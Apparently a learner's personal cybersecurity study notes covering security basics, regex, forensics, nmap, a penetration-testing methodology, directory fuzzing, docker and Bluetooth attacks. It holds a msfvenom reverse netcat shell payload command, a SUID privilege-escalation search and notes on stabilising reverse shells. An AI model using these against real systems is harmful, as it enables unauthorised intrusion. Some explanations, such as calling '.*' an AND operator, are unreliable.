*NOTES:*

CyberSpace was coined by William Gibson
Father of Cyber Security - Bob Thomas
Father of Computer Forensics - Michael Anderson

Operating System - These types of vulnerabilities are found within Operating Systems (OSs) and often result in privilege escalation.
(Mis)Configuration-based - These types of vulnerability stem from an incorrectly configured application or service. For example, a website exposing customer details.
Weak or Default Credentials - Applications and services that have an element of authentication will come with default credentials when installed. For example, an administrator dashboard may have the username and password of "admin". These are easy to guess by an attacker. 
Application Logic - These vulnerabilities are a result of poorly designed applications. For example, poorly implemented authentication mechanisms that may result in an attacker being able to impersonate a user.
Human-Factor - Human-Factor vulnerabilities are vulnerabilities that leverage human behaviour. For example, phishing emails are designed to trick humans into

Confidentiality: During online shopping, you expect your credit card number to be disclosed only to the entity that processes the payment. If you doubt that your credit card information will be disclosed to an untrusted party, you will most likely refrain from continuing with the transaction. Moreover, if a data breach results in the disclosure of personally identifiable information, including credit cards, the company will incur huge losses on multiple levels.

Integrity: After filling out your order, if an intruder can alter the shipping address you have submitted, the package will be sent to someone else. Without data integrity, you might be very reluctant to place your order with this seller.

Availability: To place your online order, you will either browse the store’s website or use its official app. If the service is unavailable, you won’t be able to browse the products or place an order. If you continue to face such technical issues, you might eventually give up and start looking for a different online store.

The NIST Cybersecurity Framework is a popular framework used to improve an organisations cybersecurity standards and manage the risk of cyber threats. This framework is a bit of an honourable mention because of its popularity and detail.

Regular expressions (RegEx) are an art of expression language to search for patterns in text and files. They can be used to find and replace text, analyze data, validate input, perform searches, and more. In simple terms, they are a filter criterion that can be used to analyze and manipulate strings. They are available in various programming languages and programs and are used in many different ways and functions.We can use it in tools like grep or sed or others.
1	(a)	The round brackets are used to group parts of a regex. Within the brackets, you can define further patterns which should be processed together.
2	[a-z]	The square brackets are used to define character classes. Inside the brackets, you can specify a list of characters to search for.
3	{1,10}	The curly brackets are used to define quantifiers. Inside the brackets, you can specify a number or a range that indicates how often a previous pattern should be repeated.
4	|	Also called the OR operator and shows results when one of the two expressions matches
5	.*	Also called the AND operator and displayed results only if both expressions match

grep -E '\bAuthentication\b' /etc/ssh/sshd_config - ends with authentication
grep -E '\bPermit\w*' /etc/ssh/sshd_config - starts with permit
grep -v '#' /etc/ssh/sshd_config - doesnot contains #

File Descriptors:
Data Stream for Input
STDIN – 0
Data Stream for Output
STDOUT – 1
Data Stream for Output that relates to an error occurring.
STDERR – 2
ex : find /etc/ -name passwd 2>/dev/null | wc -l

MAC flooding - This involves sending many packets with different MAC addresses to a network switch, causing it to reach its MAC address table capacity and effectively preventing it from functioning correctly.

ARP spoofing, also known as ARP cache poisoning or ARP poison routing, is an attack that can be done using tools like Ettercap or Cain & Abel in which we send falsified ARP messages over a LAN. 

"Obfuscation" is a technique used to make a script more difficult to read by humans but allows it to function the same from a technical point of view, though performance may be slower. This is usually achieved automatically by using an obfuscation tool, which takes code as an input, and attempts to re-write the code in a way that is much more difficult to read, depending on its design.
Tools: beautify, unpacker, jsconsole, obfuscator.io

Sbnetting - The division of an address range of IPv4 addresses into several smaller address ranges.

MAC - media access control - a4:c3:f0:85:ac:2d - first 6->vendor address, last 6->unique address

TCP Wrappers - the /etc/hosts.allow file specifies which services and hosts are allowed access to the system, whereas the /etc/hosts.deny file specifies which services and hosts are not allowed access. These files can be configured by adding specific rules to the files.

netcat - primary usage is for connecting to shells, which we'll discuss later in this module. In addition to that, netcat can be used to connect to any listening port and interact with the service running on that port
iptables - used in firewall[input, output, pre and post routing].

Socat - Socat is a very handy utility that should be a part of every penetration tester's toolkit. A standalone binary of Socat can be transferred to a system after obtaining remote code execution to get a more stable reverse shell connection.

Classless Inter-Domain Routing (CIDR) - It is a method of representation and replaces the fixed assignment between IPv4 address and network classes (A, B, C, D, E). The division is based on the subnet mask or the so-called CIDR suffix, which allows the bitwise division of the IPv4 address space and thus into subnets of any size. The CIDR suffix indicates how many bits from the beginning of the IPv4 address belong to the network. It is a notation that represents the subnet mask by specifying the number of 1-bits in the subnet mask

tmux(terminal multiplexer) - great utilities for expanding a standard Linux terminal's features, like having multiple windows within one terminal and jumping between them. -> ctrl+D to exit from tmux.

Hydra is a free and open-source password-cracking tool. It can try numerous passwords till the correct password is found. It can be used to crack passwords for various network services, including SSH, Telnet, FTP, and HTTP.

Digital Forensics - Step by Step procedure to Investigate

A forensic analyst is a person that performs an investigation to better understand what happened during an incident. This is often digital forensics that must be investigated by reviewing artefacts such as the memory or hard drive of a device.

As a digital forensics investigator, you arrive at a scene similar to the one shown in the image above. What should you do as a digital forensics investigator? After getting the proper legal authorization, the basic plan goes as follows:

->Acquire the evidence: Collect the digital devices such as laptops, storage devices, and digital cameras. (Note that laptops and computers require special handling if they are turned on; however, this is outside the scope of this room.)
->Establish a chain of custody: Fill out the related form appropriately (Sample form). The purpose is to ensure that only the authorized investigators had access to the evidence and no one could have tampered with it.
->Place the evidence in a secure container: You want to ensure that the evidence does not get damaged. In the case of smartphones, you want to ensure that they cannot access the network, so they don’t get wiped remotely.
Transport the evidence to your digital forensics lab.

At the lab, the process goes as follows:

->Retrieve the digital evidence from the secure container.
->Create a forensic copy of the evidence: The forensic copy requires advanced software to avoid modifying the original data.
->Return the digital evidence to the secure container: You will be working on the copy. If you damage the copy, you can always create a new one.
->Start processing the copy on your forensics workstation.

"Memory forensics" -> is a subset of computer forensics that analyzes volatile memory, usually on a compromised machine; in Windows OS, it corresponds to the Random Access Memory (RAM), and its content is flushed with every reboot or shutdown, making it one of the usual initial task to perform during an incident. The process differs from disk forensics analysis since it not only provides information about what resides on the target computer but also provides us with information about the processes or applications that were running at a particular time and detailed information on the execution flow on a system that may not be present in regular storage units or application logs.
phase1 : During the memory acquisition phase, we'll copy the live memory to a file, commonly referred to as a dump, to perform the analysis without risking losing the data from an inadvertent reboot on the compromised system and have proof of the analysis inc as needed.
phase2 : Next, during the memory analysis phase, we'll analyze the obtained memory dump of the forensic data.
Tools:
Windows - FTK imager, WinPmem 
Linux - LIME
MacOS - osxpmem

Volatility 3 - To analyze the dump
-f - get information about the target
windows.netstat - to see if there's an interesting or unusual connection.
windows.pstree - which will display a tree of the process running on the OS.
windows.filescan - which will allow us to examine the files accessed that are stored in the memory dump
windows.mftscan.MFTScan - If we want to have more detailed information like when the file was accessed or modified
strings pid.1612.dmp |grep -B 10 -A 10 "http://key.critical-update.com/encKEY.txt"


Tools:
Eric Zimmerman's tools:
	Eric Zimmerman is a security researcher who has written a few tools to help perform forensic analysis on the Windows platform. These tools help the registry, file system, timeline, and many other analyses.
KAPE:
	Kroll Artifact Parser and Extractor (KAPE) is another beneficial tool by Eric Zimmerman. This tool automates the collection and parsing of forensic artifacts and can help create a timeline of events.
Autopsy:
	Autopsy is an open-source forensics platform that helps analyze data from digital media like mobile devices, hard drives, and removable drives. Various plugins for autopsy speed up the forensic process and extract and present valuable information from the raw data sources.
Volatility:
	Volatility is a tool that helps perform memory analysis for memory captures from both Windows and Linux Operating Systems. It is a powerful tool that can help extract valuable information from the memory of a machine under investigation.
Redline:
	Redline is an incident response tool developed and freely distributed by FireEye. This tool can gather forensic data from a system and help with collected forensic information. 
Velociraptor:
	Velociraptor is an advanced endpoint-monitoring, forensics, and response platform. It is open-source but very powerful.

--------------------------------------------------------------------------------------------------------------
NMAP:

ThreeWay Handshake:
First the connecting terminal (our attacking machine, in this instance) sends a TCP request to the target server with the SYN flag set. The server then acknowledges this packet with a TCP response containing the SYN flag, as well as the ACK flag. Finally, our terminal completes the handshake by sending a TCP request with the ACK flag set.

Many firewalls are configured to simply drop incoming packets. Nmap sends a TCP SYN request, and receives nothing back. This indicates that the port is being protected by a firewall and thus the port is considered to be filtered.
Soln: iptables -I INPUT -p tcp --dport <port> -j REJECT --reject-with tcp-reset

nmap --script vuln www.sece.ac.in - to find the vulnerability of the website

nmap -sV -sC <target_ip>
locate /scripts/citrix - to locate the scripts for nmap.
nmap --script <script name> -p<port> <host> ->  nmap -sV --script=banner -p21 10.10.10.0/24.
banner grabbing is a useful technique to fingerprint a service quickly
TCP Connect Scans (-sT)

The Nmap Scripting Engine (NSE) is an incredibly powerful addition to Nmap, extending its functionality quite considerably. NSE Scripts are written in the Lua programming language, and can be used to do a variety of things: from scanning for vulnerabilities, to automating exploits for them. The NSE is particularly useful for reconnaissance
safe:- Won't affect the target
intrusive:- Not safe: likely to affect the target
vuln:- Scan for vulnerabilities
exploit:- Attempt to exploit a vulnerability
auth:- Attempt to bypass authentication for running services (e.g. Log into an FTP server anonymously)
brute:- Attempt to bruteforce credentials for running services
discovery:- Attempt to query running services for further information about the network

Hacker's Methodology:
	
Step 1 -> Reconnaissance and Footprinting
Reconnaissance is all about collecting information about your target.
Footprinting - collect as much as possible information

Step 2 -> Scanning and Enumeration
This is where a hacker will start interacting with (scanning and enumerating) the target to attempt to find vulnerabilities related to the target.
Tools like nmap, dirb, metasploit, exploit-db, Burp Suite 
dirb -> (used to find commonly-named directories on a website 
dirbuster -> (similar to dirb but with a cooler name, and with a user interface)
enum4linux -> (tool used specifically for Linux to find vulnerabilities)
metasploit -> (this tool is mostly used for exploitation, but it also has some built-in enumeration tools)
Burp Suite -> (this tool can be used to scan a website for subdirectories and to intercept network traffic)
enum4linux

Step 3 -> Exploitation
The exploitation phase can only be as good as the recon and enumeration phases before it, if you did not enumerate all vulnerabilities you may miss an opportunity, or if you did not look hard enough at the target - the exploit you have chosen may fail entirely
primary tool : Metasploit, SQLMap, BurpSuite

Step 4 -> Privilege Escalation [Resources : Hacktricks, PayloadsAllTheThings]
Cracking password hashes found on the target
Finding a vulnerable service or version of a service which will allow you to escalate privilege THROUGH the service
Password spraying of previously discovered credentials (password re-use)
Using default credentials
Finding secret keys or SSH keys stored on a device which will allow pivoting to another machine
Running scripts or commands to enumerate system settings like 'ifconfig' to find network settings, or the command 'find / -perm
-4000 -type f 2>/dev/null' to see if the user has access to any commands they can run as root

Step 5 -> Covering Tracks
Since the rules of engagement for a penetration test should be agreed to before the test occurs, the penetration tester should stop IMMEDIATELY when they have achieved privilege escalation and report the finding to the client. 

Step 6 -> Reporting phase
This is one of the most important phases where you will outline everything that you found. The reporting phase often includes the following things:
-The Finding(s) or Vulnerabilities
-The CRITICALITY of the Finding
-A description or brief overview of how the finding was discovered
-Remediation recommendations to resolve the finding

Gobusters, ffuf and Dirbuster

Gobuster is a free and open-source directory and file enumeration tool. Penetration testers and security professionals use it to fin hidden directories and files on web servers.
ex: gobuster dir --url http://www.onlineshop.thm/ -w=/usr/share/wordlists/dirbuster/directory-list.txt
ex: gobuster dir -u <link> --wordlists=/usr/share/wordlists/dirbuster/directory-list.txt

ffuf: for subdomains
ffuf -u http:/permx.htb/ -H "Host:FUZZ.permx.htb" -w /home/user/HacktheBox/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -fw 18
--------------------------------------------------------------------------------------------------------------
Dockers: [use sudo]
Images - instructions for what a container should execute.
docker pull - images downloading [ex: docker pull nginx:latest]
docker images - to manage the image and list all the images
docker image ls - This command allows us to list all images stored on the local system
docker image rm <image_name> - to remove an image from the system,
docker run -d helloworld - for running in background
docker ps - lists all running docker files
--------------------------------------------------------------------------------------------------------------
Reverse Shell:

using msfvenom:
msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R
-p = payload
lhost = our local host IP address (this is your machine's IP address)
lport = the port to listen on (this is the port on your machine)
R = export the payload in raw format


tcpdump listener:
If using your own machine with the OpenVPN connection, use:
sudo tcpdump ip proto \\icmp -i tun0

If using the AttackBox, use:
sudo tcpdump ip proto \\icmp -i ens5

SQL Injection:

Types of Attacks: In-band, Out-band, Blind, Compound Injection


--------------------------------------------------------------------------------------------------------------
Hardware Attacks: Bluetooth Hacking, cryptanalysis side-channel attacks, and microprocessor vulnerabilities.

Bluetooth Hacking:
Types:
Bluesnarfing: A cyber-attack involving unauthorised access to information from wireless devices through Bluetooth.
Bluejacking: An attack that sends unsolicited messages to Bluetooth-enabled devices.
BlueSmacking: A Denial-of-Service attack that overwhelms a device's Bluetooth connection.
Bluebugging: A technique used to gain control over a device via Bluetooth.
BlueBorne: A set of vulnerabilities that allow attackers to take control of devices, spread malware, or perform other malicious activities via Bluetooth.
KNOB (Key Negotiation of Bluetooth): An attack that manipulates the data encryption process during Bluetooth connection establishment, weakening security.
BIAS (Bluetooth Impersonation AttackS): This attack exploits a vulnerability in the pairing process, allowing an attacker to impersonate a trusted device.
